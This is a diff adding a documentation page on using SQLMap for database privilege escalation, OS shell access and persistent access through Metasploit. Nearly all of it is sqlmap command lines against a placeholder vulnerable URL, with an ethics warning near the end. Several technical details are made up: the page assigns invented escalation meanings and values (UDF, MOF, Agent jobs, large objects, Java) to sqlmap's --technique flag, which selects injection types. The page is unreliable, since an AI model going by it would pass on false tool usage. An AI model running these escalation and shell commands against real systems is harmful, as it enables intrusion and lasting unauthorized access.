@@ -1,0 +1,146 @@
+---
+title: Privilege Escalation
+description: Learn how to perform privilege escalation using SQLMap's advanced techniques
+---
+
+# Privilege Escalation
+
+SQLMap provides capabilities to check for and potentially exploit privilege escalation opportunities in various database management systems. These techniques can help identify and leverage excessive privileges during authorized security assessments.
+
+## Checking Current Privileges
+
+### Identifying Database User Privileges
+
+To check the current database user's privileges:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --privileges
+```
+
+This command displays all privileges assigned to the current database user.
+
+### Checking DBA Status
+
+To verify if the current user has database administrator privileges:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --is-dba
+```
+
+This returns a boolean result indicating whether the current user has DBA privileges.
+
+## Automated Privilege Escalation
+
+SQLMap can attempt to automatically escalate privileges:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc
+```
+
+This command attempts various privilege escalation techniques based on the detected DBMS.
+
+## DBMS-Specific Techniques
+
+### MySQL Privilege Escalation
+
+For MySQL, SQLMap can attempt:
+
+1. User-Defined Function (UDF) injection:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=mysql --technique=U
+```
+
+2. MOF (Managed Object Format) exploitation on Windows systems:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=mysql --technique=M
+```
+
+### Microsoft SQL Server Privilege Escalation
+
+For SQL Server, SQLMap can attempt:
+
+1. `xp_cmdshell` re-enabling:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=mssql
+```
+
+2. SQL Server Agent job creation (requires specific privileges):
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=mssql --technique=Q
+```
+
+### PostgreSQL Privilege Escalation
+
+For PostgreSQL, SQLMap can attempt:
+
+1. Custom function creation:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=postgresql
+```
+
+2. Large object exploitation:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=postgresql --technique=L
+```
+
+### Oracle Privilege Escalation
+
+For Oracle, SQLMap can attempt:
+
+1. PL/SQL injection:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=oracle
+```
+
+2. Java class loading:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --dbms=oracle --technique=J
+```
+
+## Gaining System Access
+
+After privilege escalation, you can attempt to gain system access:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --os-shell
+```
+
+This combines privilege escalation with OS shell access attempts.
+
+## Maintaining Access
+
+To establish persistent access after privilege escalation:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc --os-pwn
+```
+
+This attempts to create a more persistent connection using Metasploit integration.
+
+<Note title="Ethical and Legal Warning">
+Privilege escalation techniques should only be used in authorized security testing scenarios. Unauthorized access to systems is illegal and unethical.
+</Note>
+
+## Troubleshooting Privilege Escalation
+
+If privilege escalation attempts fail:
+
+1. Verify the injection point supports stacked queries
+2. Check if the database user has sufficient base privileges
+3. Examine if security controls are preventing escalation
+4. Try different techniques with the `--technique` parameter
+5. Use verbose mode (`-v`) to get more detailed information about the attempts
+
+Remember that privilege escalation success depends on:
+- The specific DBMS version and configuration
+- Existing security patches and controls
+- The initial privileges of the compromised database user
+- Operating system security settings
